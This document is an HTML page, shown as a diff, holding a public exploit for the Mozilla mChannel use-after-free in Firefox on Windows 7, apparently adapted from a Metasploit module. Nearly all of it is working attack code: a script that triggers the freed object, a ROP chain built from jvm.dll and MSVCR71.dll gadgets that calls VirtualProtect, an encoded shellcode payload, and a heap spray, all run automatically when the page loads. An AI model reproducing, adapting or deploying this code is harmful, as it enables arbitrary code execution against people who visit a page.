@@ -1,0 +1,152 @@
+<html>
+<body>
+<applet code="rubik.class" width=140 height=140></applet>
+<p><b>Mozilla mChannel Object use after free</b><br />
+- Found by regenrecht<br />
+- MSF exploit by Rh0<br />
+- Win 7 fun version by mr_me</p>
+<!--
+Notes:
+
+- This exploit requires <= java 6 update 25.
+- optimized heap spray and still works on mutiple tabs as 
+  the spray is large enough to hit the 0x10000000 block.
+- If you really want the class file you can get it here: 
+  http://javaboutique.internet.com/Rubik/rubik.class,
+  but java still loads without it.
+- Tested on windows 7 ultimate (latest updates).
+- http://bit.ly/qD4Jkc
+
+-->
+<object id="d"><object>
+<script type="text/javascript">
+function trigger(){
+		alert('ready?');
+		
+		fakeobject = document.getElementById("d"); // allocate the object
+        	fakeobject.QueryInterface(Components.interfaces.nsIChannelEventSink); // append to the objects available functions
+		fakeobject.onChannelRedirect(null,new Object,0); // free it
+
+		/* 
+		fill the object with a fake vtable reference
+		just use the start of a block for simplicity and use \x00
+		because it expands to a NULL so that
+		when we have have the CALL DWORD PTR DS:[ECX+18], it will point to 0x10000000
+		*/
+		fakevtable = unescape("\x00%u1000");
+		
+		var rop = "";
+
+		// 3 instructions to pivot cleanly
+		rop += unescape("%u1033%u6d7f"); // 0x6D7F1033 -> MOV EAX,[ECX] / PUSH EDI / CALL [EAX+4] <jvm.dll>
+		rop += unescape("%u10a7%u6d7f"); // 0x6D7F10A7 -> POP EBP / RETN <jvm.dll>
+		rop += unescape("%u1441%u6d7f"); // 0x6D7F1441 -> XCHG EAX,ESP / RETN <jvm.dll>
+
+		// generic rop taken from MSVCR71.dll (thanks to corelanc0d3r)
+		rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
+		rop += unescape("%ua140%u7c37"); // 0x7c37a140 -> Make EAX readable
+		rop += unescape("%u591f%u7c37"); // 0x7c37591f -> PUSH ESP / ... / POP ECX / POP EBP / RETN
+		rop += unescape("%uf004%ubeef"); // 0x41414141 -> EBP (filler)
+		rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
+		rop += unescape("%ua140%u7c37"); // 0x7c37a140 -> *&VirtualProtect()
+		rop += unescape("%u30ea%u7c35"); // 0x7c3530ea -> MOV EAX,[EAX] / RETN 
+		rop += unescape("%u6c0b%u7c34"); // 0x7c346c0b -> Slide, so next gadget would write to correct stack location
+		rop += unescape("%u6069%u7c37"); // 0x7c376069 -> MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN
+		rop += unescape("%uf00d%ubeef"); // 0x41414141 -> EDI (filler)
+		rop += unescape("%uf00d%ubeef"); // 0x41414141 -> will be patched at runtime (VP), then picked up into ESI
+		rop += unescape("%uf00d%ubeef"); // 0x41414141 -> EBX (filler)
+		rop += unescape("%u6402%u7c37"); // 0x7c376402 -> POP EBP / RETN 
+		rop += unescape("%u5c30%u7c34"); // 0x7c345c30 -> ptr to 'push esp / ret ' 
+		rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
+		rop += unescape("%udfff%uffff"); // 0xfffffdff -> size 0x00000201 -> ebx, modify if needed
+		rop += unescape("%u1e05%u7c35"); // 0x7c351e05 -> NEG EAX / RETN 
+		rop += unescape("%u4901%u7c35"); // 0x7c354901 -> POP EBX / RETN 
+		rop += unescape("%uffff%uffff"); // 0xffffffff -> pop value into ebx
+		rop += unescape("%u5255%u7c34"); // 0x7c345255 -> INC EBX / FPATAN / RETN 
+		rop += unescape("%u2174%u7c35"); // 0x7c352174 -> ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN 
+		rop += unescape("%ud201%u7c34"); // 0x7c34d201 -> POP ECX / RETN
+		rop += unescape("%ub001%u7c38"); // 0x7c38b001 -> RW pointer (lpOldProtect) (-> ecx)
+		rop += unescape("%ub8d7%u7c34"); // 0x7c34b8d7 -> POP EDI / RETN 
+		rop += unescape("%ub8d8%u7c34"); // 0x7c34b8d8 -> ROP NOP (-> edi)
+		rop += unescape("%u4f87%u7c34"); // 0x7c344f87 -> POP EDX / RETN 
+		rop += unescape("%uffc0%uffff"); // 0xffffffc0 -> value to negate, target value : 0x00000040, target: edx
+		rop += unescape("%u1eb1%u7c35"); // 0x7c351eb1 -> NEG EDX / RETN 
+		rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN 
+		rop += unescape("%u9090%u9090"); // 0x90909090 -> NOPS (-> eax)
+		rop += unescape("%u8c81%u7c37"); // 0x7c378c81 -> PUSHAD / ADD AL,0EF / RETN 
+
+		sc = rop;		
+		// nice big 'calccode' (0x400 bytes)
+		sc += unescape("%uf869%u0d93%u3578%u7704%u902d%u432c%u249f%uba46%u983c%ub299%ufe13%uf9c0"+
+		"%u784f%u2f7c%u4fa9%u7a76%ub235%u7027%u2f73%ub937%ud380%u0de3%u157f%u93b5%ubfba%u4291"+
+		"%ufc03%u3d40%u729f%u9b24%u7e7b%u3814%u8dfd%u2592%u892c%u01e0%uf9d0%u41b1%uf731%u75e1"+
+		"%ubb3f%u7d79%uf811%u6734%u992d%u4b49%u6690%u71b4%ua847%u094a%u05eb%u4eb3%ud119%u3ae2"+
+		"%u0cd6%u96be%ub0b8%u4697%u98b7%u1048%ub6d5%u1c04%uf56b%u201d%u74d4%u773c%u727f%u7b7d"+
+		"%u7e7c%u7571%u9743%u1c49%ubb90%u4e74%u3cb5%ua993%ub09f%u73ba%ud522%u8d4f%u98be%u3304"+
+		"%u88f5%u43d4%u92b4%u7ab8%ud60a%u1da8%ub14a%uf82a%ub7b2%u2c41%u3b79%u05fd%u85b9%u76e0"+
+		"%ufc1a%u4b35%u9647%u8134%u24e1%u8366%u48e3%u4214%u870c%uebd2%u3f78%u9bb3%uff1b%uc1c7"+
+		"%u67e2%u910d%u70b6%u4615%u2d25%u772f%u993d%ubf27%u1240%u37f9%u7a77%u7279%u9167%u2f76"+
+		"%ubeb5%u15b6%u7d7f%u303f%u40e3%u11b7%u19e0%u39e2%u04fc%ua8ba%u991d%ud518%u41bb%u78bf"+
+		"%u9834%ub8b4%u270d%u8390%u4ffd%u31b1%u70e1%u4349%u86b3%u9ff5%u331c%ud6f7%u667e%ua93c"+
+		"%u9b8d%uf687%u46d4%u4293%u7314%u3d35%u257b%u4a97%u37b0%u2496%u4b74%u2c75%u92b9%u2d7c"+
+		"%u4748%u694e%uebd3%uf829%u08b2%u71f9%u790c%u717a%u227b%u05e2%u3cb8%u9fb6%u7896%uf903"+
+		"%u217e%ubfd6%u4e91%u3db3%u777c%u0d76%u7372%u1541%ub2ba%u342c%u9048%ud484%ue189%u4f05"+
+		"%u677f%ubbb9%u4370%u7d74%u1c75%ua92d%u1342%u93f5%u090c%u12e3%u92f8%u662f%u49b0%u8d99"+
+		"%ub44b%uc688%uebc0%u474a%u2b37%u46fc%u0a9b%u04fd%ue086%u2740%ua8be%u35b5%u3f97%u24b1"+
+		"%u1498%u25b7%u7c1d%u0b7f%ub1d5%u410c%u1047%u7deb%ue228%u7672%u7e78%u7177%u1b73%ufdd0"+
+		"%u3bb2%u3ce0%u7515%u4e25%uf52a%u70b9%u3540%u9993%ubf2c%u85b5%u79fc%u3474%u377b%ud26b"+
+		"%ubed5%u982d%ue33a%u9243%u7a14%ub33d%u9048%ubb8d%u9b24%u2f46%u20b0%uf9d1%ub897%ua866"+
+		"%ub4b7%ua996%ub642%ue180%u4a27%u1a77%u9fd4%u017e%u18eb%u8cf8%ubad6%u1c7c%u497f%u7467"+
+		"%u784f%u914b%u3271%u04e0%u0d7a%u1d79%u397b%ue2c1%u7d05%u933f%u70b1%ub324%u3cb8%u6642"+
+		"%u961c%u9b27%u72bf%ue338%ub53d%u3040%ub4fc%u7646%uf525%u029f%ubad5%u0cf8%u3fa9%u7514"+
+		"%ubb0d%u23e1%ub9d6%u05d4%u378d%ub243%ub735%u1573%u4798%u2c48%ua84b%ufd41%u4f2d%u1db6"+
+		"%u9049%uf981%ube04%u3491%u924e%ub097%u2f4a%u9967%u8dbe%u5994%udbe7%ud9da%u2474%u58f4"+
+		"%uc929%u33b1%u7031%u8312%u04c0%ufd03%ubb9a%u0112%ub24a%uf9dd%ua58b%u1c54%uf7ba%u5503"+
+		"%uc7ef%u3b40%ua31c%uaf05%uc197%uc081%u6f10%ueff4%u41a1%ua338%uc362%ub9c4%u23b6%u72f4"+
+		"%u22cb%u6e31%u7624%ue5ea%u6797%ubb9f%u892b%ub04f%uf114%u06ea%u4be0%u56f4%uc759%u4ebe"+
+		"%u8fd1%u6f1e%ucc36%u2663%u2733%ub917%u7995%u88d8%ud6d9%u25e7%u27d4%u812f%u5207%uf25b"+
+		"%u65ba%u8998%ue360%u293d%u53e2%uc8e6%u0527%uc66d%u418c%uca29%u8513%uf641%u2898%u7f86"+
+		"%u0eda%u2402%u2fb8%u8013%u4f6f%u6c43%uf5cf%u9e0f%u8f04%uf44d%u1ddb%ub1e8%u1ddc%u91f3"+
+		"%u2cb4%u7e78%ub0c2%u3bab%ufb3c%u6df6%ua2d5%u2c62%u54b8%u7259%ud6c5%u0a68%uc632%u0f18"+
+		"%u407e%u7df0%u25ef%ud2f6%u6c10%ub595%uec82%u5074%u9623%u4188");
+
+		// create a string with a ptr to the offset of our rop
+		// used 0x1000001c to accomidate 0x18 + 0x4 (1st rop gadget)
+		var filler = unescape("%u001c%u1000");
+		while(filler.length < 0x100) {filler += filler;}
+
+		/*
+		create a string with 0x18 bytes at the start containing ptr's to the rop.
+		This is to account for the vtable offset (0x18) -> 'CALL DWORD PTR DS:[ECX+18]'
+		Then fill with sc + junk
+		*/
+		var chunk = filler.substring(0,0x18/2);
+		chunk += sc; 
+		chunk += filler;
+
+		// create a string of size 64k in memory that contains sc + filler
+		var heapblock = chunk.substring(0,0x10000/2); 
+		
+		// keep adding more memory that contains sc + filler to reach 512kB
+		while (heapblock.length<0x80000) {heapblock += heapblock;} 
+
+		/* 
+		using a final string of 512kB so that the spray is fast but ensuring accuracy
+		- sub the block header length (0x24)
+		- sub 1/4 of a page for sc (0x400)
+		- sub the string length (0x04)
+		- sub the null byte terminator
+		*/ 
+		var finalspray = heapblock.substring(0,0x80000 - sc.length - 0x24/2 - 0x4/2 - 0x2/2);
+
+		// optimised spray, precision can still be reliable even with tabs.
+		// force allocation here of 128 blocks, using only 64MB of memory, speeeeeeed.
+		arrayOfHeapBlocks = new Array()
+		for (n=0;n<0x80;n++){
+			arrayOfHeapBlocks[n] = finalspray + sc;
+		}
+}
+trigger();
+</script>
+</body>
+</html>
